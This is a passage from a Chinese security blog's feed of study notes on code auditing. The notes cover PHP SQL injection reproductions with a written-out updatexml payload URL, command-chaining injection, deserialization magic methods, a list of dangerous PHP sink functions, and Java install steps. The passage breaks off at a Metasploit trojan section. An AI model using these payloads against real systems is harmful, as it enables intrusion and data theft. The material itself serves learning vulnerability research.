zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: PHPSESSID=rut2a51prso470jvfe2q502o44; cookie 最后面存在一个&amp;quot;;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
        <title>XD22 8 代码审计</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
        <content type="html">&lt;h3 id=&#34;php-代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-代码审计&#34;&gt;#&lt;/a&gt; php 代码审计&lt;/h3&gt;
&lt;h4 id=&#34;php-sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-sql注入&#34;&gt;#&lt;/a&gt; php sql 注入&lt;/h4&gt;
&lt;p&gt;1day 去敏 cnvd 漏洞复现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;梦想 CMS 后台 Bo***.cl***.php 文件存在 SQL 注入漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;漏洞说明:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY252ZC5vcmcuY24vZmxhdy9zaG93L0NOVkQtMjAyMC01OTQ2Ng==&#34;&gt;https://www.cnvd.org.cn/flaw/show/CNVD-2020-59466&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost:8081/lmxcms1.4/admin.php?m=book&amp;amp;a=reply&amp;amp;id=1)%20and% 20updatexml(0,concat(0x7e,user()),1)%23&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过寻找到漏洞存在的文件，查找相关的 sql 注入，根据可输入的变量与变 量在代码中的执行流程来寻找，跟踪变量在代码中的行走轨迹，并进行过滤的 绕过，最后将数据库中执行的代码打印出来进行闭合并爆出敏感信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LmxCMS V1.4 前台 Ta***.cl***.php 存在 SQL 注入漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;漏洞说明:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY252ZC5vcmcuY24vZmxhdy9zaG93L0NOVkQtMjAxOS0wNTY3NA==&#34;&gt;https://www.cnvd.org.cn/flaw/show/CNVD-2019-05674&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对比 1.4 与 1.41 文件代码不同更方便 - Beyond Compare 4&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost:8081/lmxcms1.4/?m=tags&amp;amp;name=%25%36%31%25%32%37%25%.....&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;进行新旧版本的对比之后，寻找更新的代码，用 beyond 工具可以很方便的，看出来被更新过的文件，通过更新来判断哪些漏洞被修复依次来判断出之前的 版本的漏洞的产生点。其次，此漏洞是因为用户的浏览器会自动进行一次 url 解 码，而前台的代码仍旧含有 urldecode 函数，导致用户编码两次的恶意 sql 注入 代码被执行。&lt;/p&gt;
&lt;h4 id=&#34;php-文件操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-文件操作&#34;&gt;#&lt;/a&gt; php 文件操作&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;文件读取&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有敏感的函数，是从敏感函数全局搜索跟踪变量，进行可控变量的寻找， 然后绕过相关过滤机制，进行任意文件读取的一种操作。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件下载&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从功能点挖掘，因为是没有文件下载对应函数的，抓包分析对应代码，看 下载的变量是否可以控制，追踪此变量所在的方法及最终被谁控制的，这个控 制此变量的因素是否能人为的修改，如果能够人为修改，是否有相应的过滤， 有过滤的话还需要绕过过滤；需要将网站界面代码和数据库统统对应上，分析 数据库中的数据来源及人为可控程度，进而依据此漏洞来读取敏感文件如数据 库配置文件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件删除&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关键字挖掘 - 文件删除搜索关键字 unlink，对应函数 del_file，查看调用，后 台 delfile 函数调用，如何处理 delfile 函数，受参数控制，进行测试，构造 Payload - 确定过滤 - 重新构造 Payload - 配合重装机制实现重装漏洞。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未授权漏洞配合文件删除&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代码执行逻辑问题，文件在后台被删除的时候虽然已经跳转到了登录界面，但是仍然可以继续执行此前的代码，导致恶意命令执行成功。&lt;/p&gt;
&lt;h4 id=&#34;php-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-rce&#34;&gt;#&lt;/a&gt; php RCE&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;常见漏洞关键字&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SQL注入：select insert update mysql_query mysqli等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;文件上传：$_FILES，type=&amp;quot;file&amp;quot;，上传，move_uploaded_file()等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;XSS跨站：print print_r echo sprintf die var_dump var_export等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;文件包含：include include_once require require_once等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;代码执行：eval assert preg_replace call_user_func call_user_func_array等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;命令执行：system exec shell_exec `` passthru pcntl_exec popen proc_open&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;变量覆盖：extract() parse_str() importrequestvariables() $$ 等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;反序列化：serialize() unserialize() __construct __destruct等&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;其他漏洞：unlink() file_get_contents() show_source() file() fopen()等&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;RCE 挖掘思路&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常规或部分 MVC 模型源码可以采用关键字的搜索挖掘思路。&lt;/p&gt;
&lt;p&gt;框架 MVC 源码一般会采用功能点分析抓包追踪挖掘思路，可能会把代码进 行封装，不在用原有的函数而是采用框架封装后的代码。&lt;/p&gt;
&lt;p&gt;依然是从函数出发，全局搜索出来可能执行系统命令的函数如 system，查 看是否有可控变量，进行追踪变量，判断是否能绕过相关过滤。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;linux 命令拼接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过 &amp;amp; 或者 | 可以拼接命令，如果前边或者后边的语法有问题则会报错但是拼接另外一边的正确命令仍然会被执行，如 xxxx&amp;amp;id&amp;amp;1.txt 则会出现 id 的执行效果。&lt;/p&gt;
&lt;h4 id=&#34;php反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化&#34;&gt;#&lt;/a&gt; php 反序列化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;自动审计或搜索关键字找到文件及代码段&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;寻找关键词unseriral()，找到之后判断魔术方法会执行到哪里，看是否能执行到魔术方法，进行构造，伪造参数绕过相关过滤。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__wakeup() //使用unserialize时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep() //使用serialize时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct() //对象被销毁时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__call() //在对象上下文中调用不可访问的方法时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__callStatic() //在静态上下文中调用不可访问的方法时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__get() //用于从不可访问的属性读取数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set() //用于将数据写入不可访问的属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isset() //在不可访问的属性上调用isset()或empty()触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__unset() //在不可访问的属性上使用unset()时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__toString() //把类当作字符串使用时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__invoke() //当脚本尝试将对象调用为函数时触发&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;tp代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tp代码审计&#34;&gt;#&lt;/a&gt; tp 代码审计&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;tp 框架漏洞挖掘&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般分为 1day 和 0day，1day 的话是网络上已经确定了有此版本对应框架的 漏洞，但是未公开处来 poc，在 github 上也能搜索到安全更新等关键词，可以拿 到新更新的源码和之前的版本用 beyond 版本进行对比，审计 1day 代码审计， 获取 1day 的 exp。&lt;/p&gt;
&lt;p&gt;主要还是查代码，走流程，看功能或者特定函数，看过滤，判断能否绕过，打断点，追踪数据流，对应 url 地址与代码端进行漏洞的挖掘。框架 0day 就别 想了，太难了，可以对照搞几个 1day 尝试一下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用官方更新说明探针&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RvcC10aGluay9mcmFtZXdvcms=&#34;&gt;https://github.com/top-think/framework&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL01vY2hhenovVGhpbmtQSFAtVnVsbg==&#34;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;net代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#net代码审计&#34;&gt;#&lt;/a&gt; net 代码审计&lt;/h3&gt;
&lt;p&gt;asp.net 可以用 C# ，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1ZCLk5FVA==&#34;&gt;VB.NET&lt;/span&gt; ，Jscript.net 等等来开发，但是通常首选都是 C#&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1WQi1peTZjLk5FVA==&#34;&gt;和 VB.NET&lt;/span&gt;，审计 asp.net 的时候，首先得弄明白他的结构，他并不像 php 那么单纯。在 asp.net 应用中，需要进行观察的文件有：.aspx，.cs，.ashx，dll。&lt;/p&gt;
&lt;p&gt;.aspx 是页面后的代码，aspx 负责显示，服务器端的动作就是在.cs 定义的&lt;br&gt;
.cs 是类文件，里边是程序和函数&lt;br&gt;
.ashx 是一般处理程序，主要用于写 web handler, 可以理解成不会显示的 aspx 页面&lt;br&gt;
.dll 就是 cs 文件编译之后的程序集&lt;/p&gt;
&lt;h3 id=&#34;java代码审计没听&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java代码审计没听&#34;&gt;#&lt;/a&gt; java 代码审计（没听）&lt;/h3&gt;
&lt;p&gt;没听懂，我日他妈，真他妈难&lt;/p&gt;
</content>
        <category term="渗透测试" />
        <updated>2022-12-29T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/</id>
        <title>XD22 14 打破常规</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/"/>
        <content type="html">&lt;h3 id=&#34;java19-安装&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java19-安装&#34;&gt;#&lt;/a&gt; Java19 安装&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;mac 安装 java 19 的操作步骤如下&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;下载高版本的jdk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.oracle.com/java/technologies/downloads/#jdk19-mac&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://download.oracle.com/java/19/latest/jdk-19_macos-aarch64_bin.dmg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;多个java存在时使用高版本的java&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://docs.oracle.com/en/java/javase/19/install/installation-jdk-macoshtml#GUID-C5F0BF25-3487-4F33-9275-7000C8E1C58C&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -version&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/usr/libexec/java_home -v 19 --exec java -version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;kali 安装 java 19 的操作步骤如下&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取源码地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.oracle.com/java/technologies/downloads/#jdk19-linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将源码下载到/opt/etc目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo wget https://download.oracle.com/java/19/latest/jdk-19_linux-aarch64_bin.tar.gz -O /etc/opt/jdk19.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo tar -zxvf jdk-19_linux-aarch64_bin.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cp -r jdk-19/ /usr/bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装并注册&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo update-alternatives --install /usr/bin/java java /etc/opt/jdk-19 /bin/java 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo update-alternatives --install /usr/bin/javac javac /etc/opt/jdk-19/bin/javac 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo update-alternatives --set java /etc/opt/jdk-19/bin/java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo update-alternatives --set javac /etc/opt/jdk-19/bin/javac&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检查是否成功配置Java环境&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;centos install java&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;建议获取jdk的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://jdk.java.net&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;需要打开oracle官网，寻找适合操作系统处理器的版本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo wget https://download.oracle.com/java/19/latest/jdk-19_linux-x64_bin.tar.gz - O /etc/opt/jdk1tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;让 centos 知道该链接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;update-alternatives --install /usr/bin/java java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo update-alternatives --install /usr/bin/java java /etc/opt/jdk-10.1/bin/java 100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;更新/etc/alternatives/java链接,选择当前要使用的jdk序号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo update-alternatives --config java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注：sudo yum install java-17-openjdk网络问题会失败&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检查是否安装成功&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java - version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;msf-生成木马说明&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf-生成木马说明&#34;&gt;#&lt;/a&gt; msf 生成木马说明&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span 